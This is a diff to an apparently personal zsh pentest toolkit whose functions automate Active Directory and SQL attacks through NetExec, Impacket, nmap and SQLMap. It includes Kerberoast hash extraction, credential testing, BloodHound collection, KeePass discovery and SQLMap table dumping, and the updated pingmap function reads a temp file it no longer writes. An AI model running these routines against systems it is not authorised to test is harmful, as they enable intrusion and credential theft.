@@ -3,7 +3,7 @@
 # Heavy lifting done mostly by NetExec, Impacket and SQLMap when applicable. 
 # Copyright (C) 2024 chsoares
 # Permission to copy and modify is granted under the GNU General Public License
-# Last revised 3/2024
+# Last revised 4/2024
 
 
 # ADSCAN
@@ -20,8 +20,16 @@ adscan() {
  \__,_| \__,_|\033[1;33m ____/ \___| _/  _\ _|\_| \033[0m                                      
 '  
 
-    if [ $# -eq 0 ]; then
+      
+    if [[ $# -eq 0 ]]; then
         echo "\033[1;31m[!] Missing parameters. \033[0m"
+        echo "Usage: $0 <CIDR Range>"
+        return 1
+    fi
+    
+    local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
+    if ! [[ $@ =~ $cidr_pattern ]]; then
+        echo "\033[1;31m[!] \"$@\" is not a valid CIDR range. \033[0m"
         echo "Usage: $0 <CIDR Range>"
         return 1
     fi
@@ -29,7 +37,7 @@ adscan() {
     echo "\033[1;33m[!] Running fping on the $1 network \033[0m"  
     fping -agq "$1" | tee targets.list
     if [[ -z $(grep '[^[:space:]]' targets.list) ]] ; then
-        echo "\033[1;31m[!] Empty results. Maybe you got the syntax wrong? \033[0m"
+        echo "\033[1;31m[!] Empty results. Maybe you got your parameters wrong? \033[0m"
         echo "Usage: $0 <CIDR Range>"
         return 1
     fi
@@ -44,6 +52,7 @@ adscan() {
     echo '\033[0;34m[*] Adding DC to /etc/hosts \033[0m'
     echo "$dc_ip    $domain $dc_hostname $dc_hostname.$domain" | tee -a /etc/hosts
     rm nxc.tmp
+    echo "\033[1;31m[*] Done. \033[0m"
 }
 
 # TESTCREDS
@@ -82,6 +91,7 @@ testcreds() {
     if [[ "$auth" == "password" ]]; then
         nxc ssh $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
     fi
+    echo "\033[1;31m[*] Done. \033[0m"
 }
 
 # ENUMDOMAIN
@@ -149,6 +159,17 @@ enumdomain() {
     GetUserSPNs.py "$imp_auth" | grep --color=never "\S" | tail -n +4 | awk {'print $2 " - "$1'}
     GetUserSPNs.py "$imp_auth" -request -outputfile kerb.hash 1>/dev/null
     echo '\033[0;34m[*] Saving hashes (if any) to ./kerb.hash \033[0m'
+    
+    echo "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
+    read -s -q confirm
+    if [[ $confirm =~ ^[Yy]$ ]]; then    
+      echo "\033[1;33m[!] Ingesting AD data \033[0m"
+      nxc ldap $(echo "$nxc_auth") --bloodhound --collection All | grep "\/.*zip" > path.tmp
+      mv $(cat path.tmp) ./${domain}_bloodhound.zip
+      echo "\033[0;34m[*] Saving data to ./${domain}_bloodhound.zip"
+      rm path.tmp
+    fi
+    echo "\033[1;31m[*] Done. \033[0m"
 }
 
 # ENUMUSER
@@ -198,6 +219,7 @@ enumuser() {
     
     echo "\033[1;33m[!] Trying to find KeePass files with NetExec \033[0m"
     nxc smb $(echo "$nxc_auth") -M keepass_discover | grep -oE "Found .*" --color=never
+    echo "\033[1;31m[*] Done. \033[0m"
 }
     
 #!/bin/zsh
@@ -234,65 +256,57 @@ pingmap() {
       shift     
     done
     
-    echo "\033[1;33m[!] Running fping on the $1 network\033[0m"  
-    fping -agq "$1" | tee /root/scripts/pingmap.tmp
-    if [[ -z $(grep '[^[:space:]]' /root/scripts/pingmap.tmp) ]] ; then
-        echo "\033[1;31m[!] Empty results. Maybe you got the syntax wrong? \033[0m"
-        echo "Usage: $0 [-F] <CIDR Range>"
-        return 1
-    fi    
-    
-    if [[ fast -eq 1 ]]; then
-      echo '\033[1;33m[!] Running nmap -T4 -sV -F --open on enumerated hosts\033[0m'    
-      while read item
-        do
-          nmap -T4 -sV -F --open $item
-          printf("\n")
-        done < /root/scripts/pingmap.tmp
-    else
-      echo '\033[1;33m[!] Running nmap -T4 -sV -p- --open on enumerated hosts\033[0m'    
-      while read item
-        do
-          nmap -T4 -sV -p- --open $item
-          printf("\n")
-        done < /root/scripts/pingmap.tmp
-    fi
-    rm /root/scripts/pingmap.tmp
-}
-
-
-# MASSMAP
-# Runs masscan on the network to find live hosts and make a list of their IPs and open ports. 
-# It scans all TCP and UDP ports.
-# The list then gets passed onto nmap to scan the machines further to properly enumerate running services.
-#
-# This needs gen_nmap.py by CryptoCat to work while I'm lazy and don't feel like porting it to bash
-#------------------------------------------------------------------------------------
-# Usage: massmap 172.0.0.1/24
-massmap() {
-    echo '
-                         \033[1;33m   )     \ |    )  \033[0m                    
-   ` \    _` | (_-< (_-< \033[1;33m  /     .  |   /   \033[0m   ` \    _` |  _ \ 
- _|_|_| \__,_| ___/ ___/ \033[1;33m       _|\_|       \033[0m _|_|_| \__,_| .__/ 
-                         \033[1;33m                   \033[0m              _|    
-'  
-    if [ $# -eq 0 ]; then
-        echo "\033[1;31m[!] Missing parameters. \033[0m"
+        local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
+    if ! [[ $@ =~ $cidr_pattern ]]; then
+        echo "\033[1;31m[!] \"$@\" is not a valid CIDR range. \033[0m"
         echo "Usage: $0 <CIDR Range>"
         return 1
     fi
     
-    echo "\033[1;33m[!] Running masscan on the $1 network\033[0m"  
-    masscan -p1-65535,U:1-65535 "$1" --rate=100000 --wait 0 > /root/scripts/masscan.tmp
-    /root/scripts/gen_nmap.py
+    echo "\033[1;33m[!] Running fping on the $1 network\033[0m"  
+    fping -agq "$1" | tee targets.list
+    echo '\033[0;34m[*] Saving enumerated hosts to ./targets.list \033[0m'
     
-    echo -e '\033[1;33m[!] Running nmap -T4 -sS -sU -sV on enumerated hosts and ports\033[0m'
-    while read item
-      do
-        nmap -T4 -sS -sU -sV $item
-      done < /root/scripts/nmap.tmp
-    #rm /root/scripts/masscan.tmp /root/scripts/nmap.tmp
+    if [[ -z $(grep '[^[:space:]]' /root/scripts/pingmap.tmp) ]] ; then
+        echo "\033[1;31m[!] Empty results. Maybe you got the syntax wrong? \033[0m"
+        echo "Usage: $0 [-F] <CIDR Range>"
+        return 1
+    else
+        #echo ""
+    fi    
+    
+    mkdir scan_xml
+    if [[ fast -eq 1 ]]; then
+      echo '\033[1;33m[!] Running "nmap -T4 -Pn -sV -F --open" on enumerated hosts\033[0m'    
+      while read item
+        do
+          echo "\033[0;36m[*] Scanning $item...\033[0m"
+          nmap -T4 -Pn -sV -F --open "$item" -oX scan_xml/scan_${item}.xml | sed -n '/PORT/,$p' | head -n -2 | grep --color=never -v '^[[:space:]]*$'          
+          #echo ""
+        done < targets.list
+    else
+      echo '\033[1;33m[!] Running "nmap -T4 -Pn -sV -p- --open" on enumerated hosts\033[0m'    
+      while read item
+        do
+          echo "\033[0;36m[*] Scanning $item...\033[0m"
+          nmap -T4 -Pn -sV -p- --open "$item" -oX scan_xml/scan_${item}.xml | sed -n '/PORT/,$p' | head -n -2 | grep --color=never -v '^[[:space:]]*$'
+          #echo ""
+        done < targets.list
+    fi
+    echo "\033[1;36m[?] Take screenshot of hosts' web pages? [y/N] \033[0m"
+    read -s -q confirm
+    if [[ $confirm =~ ^[Yy]$ ]]; then
+      python3 ~/scripts/nmapmerge.py -d ./scan_xml -o ./scan_xml/scan.xml > /dev/null 2>&1
+      mkdir gowitness && cd gowitness    
+      echo "\033[1;33m[!] Screenshotting pages with GoWitness \033[0m"
+      gowitness nmap -f ../scan_xml/scan.xml -t 8 -N > /dev/null 2>&1
+      echo '\033[0;34m[*] Serving GoWitness report on http://localhost:7171. Press CTRL+C to exit.'
+      gowitness server > /dev/null 2>&1
+    fi
+        
+    echo "\033[1;31m[*] Done. \033[0m"
 }
+
 
 #!/bin/zsh
 
@@ -308,28 +322,32 @@ enumsql() {
  \___| _| _| \_,_| _|_|_|\033[1;33m  ____/ \__\_\ ____| \033[0m
  '                              
 
-    if [ $# -eq 0 ]; then
+    if [[ $# -eq 0 ]]; then
         echo "\033[1;31m[!] Missing parameters. \033[0m"
         echo "Usage: target [options]"
         return 1
     fi
-                                       
+    
+    sqlmap $@ --batch | grep "Type:" > sqlmap.tmp
+    if [[ $(grep -c "time-based" sqlmap.tmp) -eq 1 ]]; then
+        echo "\033[1;31m[*] Time-based injection -- this might take a while. \033[0m"
+    fi                               
     echo "\033[1;33m[!] Grabbing database banner \033[0m"
-    sqlmap $@ --banner | grep -E --color=never "technology:|DBMS:|banner:"
+    sqlmap $@ --banner --batch | grep -E --color=never "technology:|DBMS:|banner:|system:"
     echo "\033[1;33m[!] Fetching current user \033[0m"
-    sqlmap $@ --current-user | grep -oP --color=never "(?<=current user: ').*(?=')"
+    sqlmap $@ --current-user --batch| grep -oP --color=never "(?<=current user: ').*(?=')"
     echo "\033[1;33m[!] Is current user database admin? \033[0m"
-    sqlmap $@ --is-dba | grep -oP --color=never "(?<=DBA: ).*" | highlight red "True" 
+    sqlmap $@ --is-dba --batch| grep -oP --color=never "(?<=DBA: ).*" | highlight red "True" 
     echo "\033[1;33m[!] Fetching current database \033[0m"
-    sqlmap $@ --current-db | grep -oP --color=never "(?<=current database: ').*(?=')"| tee db.tmp
+    sqlmap $@ --current-db --batch| grep -oP --color=never "(?<=current database: ').*(?=')"| tee db.tmp
     echo "\033[1;33m[!] Fetching tables \033[0m"
-    sqlmap $@ -D $(cat db.tmp) --tables | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | tee tables.tmp
+    sqlmap $@ -D $(cat db.tmp) --tables --batch | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | tee tables.tmp
     
     echo "\033[1;36m[?] Retrieve tables' schema? [y/N] \033[0m"
     read -s -q confirm
       if [[ $confirm =~ ^[Yy]$ ]]; then    
         echo "\033[1;33m[!] Retrieving schema \033[0m"
-        sqlmap $@ -D $(cat db.tmp) --schema | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*"
+        sqlmap $@ -D $(cat db.tmp) --schema --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*"
       fi
     
     while read table
@@ -338,10 +356,11 @@ enumsql() {
         read -s -q confirm
         if [[ $confirm =~ ^[Yy]$ ]]; then    
           echo "\033[1;33m[!] Dumping table's contents \033[0m"
-          sqlmap $@ -D $(cat db.tmp) -T $table --dump | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
+          sqlmap $@ -D $(cat db.tmp) -T $table --dump --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
         fi
       done < tables.tmp
-      rm tables.tmp db.tmp
+      rm tables.tmp db.tmp sqlmap.tmp
+      echo "\033[1;31m[*] Done. \033[0m"
 }
 
 #              _                   _          __  __ 
